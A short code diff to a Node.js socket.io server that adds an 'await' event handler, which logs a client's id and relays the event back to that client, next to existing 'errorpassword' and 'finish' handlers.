@@ -365,6 +365,12 @@ io.on('connection', (socket) => {
         io.to(client.id).emit('errorpassword', client)
     })
 
+    //await
+    socket.on('await', (client) => {
+        console.log(`client await: `, client.id)
+        io.to(client.id).emit('await', client)
+    })
+
     //finish
     socket.on('finish', async (clientID) => {
         const client = await Client.findByPk(clientID, { include: { association: 'operator' } })
